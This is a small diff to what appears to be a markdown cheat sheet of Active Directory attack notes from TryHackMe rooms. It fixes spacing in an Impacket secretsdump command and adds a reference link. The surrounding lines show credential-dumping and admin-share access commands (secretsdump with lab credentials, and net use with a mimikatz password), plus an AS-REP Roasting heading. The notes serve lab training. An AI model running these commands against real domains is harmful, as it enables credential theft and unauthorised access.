@@ -93,7 +93,7 @@ python3 secretsdump.py [DOMAIN-NAME]/backup:[USERNAME]@[TARGET-IP]
 ```
 Example: 
 ```
-python3 /opt/impacket/examples/secretsdump.py  spookysec.local/backup:backup2517860@10.10.6.165
+python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.6.165
 ```
 *********************************************************************************
 ## AS-REP Roasting with Rubeus
@@ -172,5 +172,6 @@ Access share without admin password example:
 net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
 ```
 *********************************************************************************
-## Reference
+## References
 https://tryhackme.com/room/attackingkerberos#
+https://tryhackme.com/room/attacktivedirectory
